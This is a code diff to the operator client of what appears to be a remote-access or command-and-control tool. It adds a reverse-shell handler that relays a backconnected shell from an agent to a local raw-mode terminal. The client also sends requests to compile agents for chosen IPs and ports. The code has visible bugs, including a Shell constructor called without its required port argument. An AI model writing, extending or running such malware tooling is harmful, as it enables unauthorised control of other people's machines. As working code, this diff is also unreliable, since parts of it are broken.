@@ -1,5 +1,11 @@
 import paramiko
 import misc
+import os
+import termios
+import fcntl
+import select
+import sys
+import pty
 import base64 as b64
 
 class AgentStruct():
@@ -193,6 +199,50 @@ class Session():
         print("[ ] Sending Reverse Shell Request...")
         self.channel.sendall("27|%s:%s" % (agent_id, port))
 
+    def do_revsh(self, agent_id, port):
+        exiting = False
+        inputs = []
+        inputs.append(self.channel)
+        pty = Shell()
+        inputs.append(pty)
+        cbuffer = ""
+
+        print("[+] Connected")
+        while not exiting:
+            try:
+                inputrd, outputrd, errorrd = select.select(inputs,[],[])
+            except select.error as e:
+                print(str(e))
+                break   
+            #except socket.error as e:
+             #   print(str(e))
+              #  break
+
+            for s in inputrd:
+                if s == self.channel:
+                    try:
+                        data = s.recv(1)
+                        data = data.decode()
+                    except UnicodeDecodeError:
+                        print("Failed to decode data")
+                        print(data)
+                        continue
+                    if data == '':
+                        print("Backconnect vanished!")
+                        sys.exit(1)
+
+                    cbuffer += data
+                    cbuffer = cbuffer.encode()
+                    pty.write(cbuffer)
+                    cbuffer = ""
+            
+                elif s == pty:
+                    data = s.read(1024)
+                    self.channel.send(data)
+                else:
+                    print("Woops finding inputfd")
+            cbuffer = ""
+
     def compile_agent(self, ip, port):
         print("[ ] Sending compile request to server (%s:%d)..." % (ip, port))
         self.channel.sendall("28|%s:%s" % (ip, port))
@@ -221,4 +271,31 @@ class Session():
             self.channel = 0
             print("[+] Backend closed down")
 
+class Shell(object):
+    def __init__(self, port, slave=0, pid=os.getpid()):
+        self.port = port
+
+        self.termios, self.fcntl = termios, fcntl
+
+        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+", buffering=0)
+
+        self.oldtermios = termios.tcgetattr(self.pty)
+        newattr = termios.tcgetattr(self.pty)
+        newattr[3] &= ~termios.ICANON & ~termios.ECHO
+
+        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)
+
+        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
+        fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
+        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)
+
+    def read(self, size=8192):
+        return self.pty.read(size)
+    def write(self, data):
+        return self.pty.write(data)
+    def fileno(self):
+        return self.pty.fileno()
+    def __del__(self):
+        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH,self.oldtermios)
+        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)
     
